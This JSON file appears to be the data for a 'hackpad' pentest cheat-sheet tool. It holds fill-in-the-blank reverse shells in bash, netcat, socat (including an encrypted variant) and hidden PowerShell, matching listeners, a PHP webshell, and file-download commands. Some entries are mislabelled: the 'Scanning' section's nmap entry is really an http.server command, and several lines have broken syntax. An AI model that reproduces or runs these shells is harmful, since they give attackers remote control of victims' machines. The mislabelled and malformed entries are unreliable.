{
	"title":"hackpad",
	"sections":[
		{
		"title":"Reverse Shells",
		"keys":[
			{
                "lname": "Reverse Shell Bash1",
                "qname": "RSB1",
                "ctext": "bash -c ‘bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>1’",
                "parms": ["LHOST","LPORT"],
                "Des": ""
			},
            {
				"lname": "Reverse Shell Bash2",
				"qname": "RSB2",
				"ctext": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
				"parms": ["LHOST", "LPORT"],
                "Des": ""
			},
            {
				"lname": "Reverse Shell Socat",
				"qname": "RSScat",
				"ctext": "socat TCP:{LHOST}:{LPORT} EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane",
				"parms": ["LHOST","LPORT"],
                "Des": ""
			},
            {
				"lname": "Listener Socat",
				"qname": "LstScat",
				"ctext": "socat TCP-L:{LPORT} FILE:`tty`,raw,echo=0",
				"parms": ["LPORT"],
                "Des": ""
			},
			{
				"lname": "Socat Encryption File",
				"qname": "scencf",
				"ctext": "openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt && cat shell.key shell.crt > shell.pem",
				"parms": [],
                "Des": "In order to use you'll need to make an encryption file for the listener."
			},
            {
				"lname": "Reverse Shell Socat Encrypted",
				"qname": "RSScatEnc",
				"ctext": "socat OPENSSL:{LHOST}:{LPORT},verify=0 EXEC:/bin/bash",
				"parms": ["LHOST","LPORT"],
                "Des": "In order to use you'll need to make an encryption file for the listener."
			},
            {
				"lname": "Listener Socat Encrypted",
				"qname": "LstScatEnc",
				"ctext": "socat OPENSSL-LISTEN:{LPORT},cert=shell.pem,verify=0 -",
				"parms": ["LPORT"],
                "Des": "Inorder to use you'll need to make an encryption file for the listener."
			},
            {
				"lname": "Reverse Shell Powershell",
				"qname": "RSPwr",
				"ctext": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
				"parms": ["LHOST", "LPORT"],
                "Des": ""
			},
			{
                "lname": "Webshell PHP",
				"qname": "WSPHP",
				"ctext": "<?php system($_REQUEST[“cmd”]; ?>",
				"parms": [],
                "Des": ""
            }

		]
	},
	{
		"title":"File Transfers",
		"keys":[
			{
                "lname": "Python http.server",
				"qname": "PHS",
				"ctext": "python3 -m http.server 8000",
				"parms": [],
                "Des": "Can use wget http://<IP>:8000/<filename> to download file"
            },
			{
                "lname": "Python http.server",
				"qname": "PHS",
				"ctext": "powershell.exe (New-Object System.Net.WebClient).DownloadFile('{URL}/{Filename}','{Filename}')\n",
				"parms": ["URL", "Filename"],
                "Des": ""
            }
		]
	},
		{
		"title":"Scanning ",
		"keys":[
			{
                "lname": "Baseline nmap scan",
				"qname": "NMAP1",
				"ctext": "python3 -m http.server 8000",
				"parms": [],
                "Des": "Can use wget http://<IP>:8000/<filename> to download file"
            },
			{
                "lname": "Python http.server",
				"qname": "PHS",
				"ctext": "powershell.exe (New-Object System.Net.WebClient).DownloadFile('{URL}/{Filename}','{Filename}')\n",
				"parms": ["URL", "Filename"],
                "Des": ""
            }
		]
	}
  ]
}
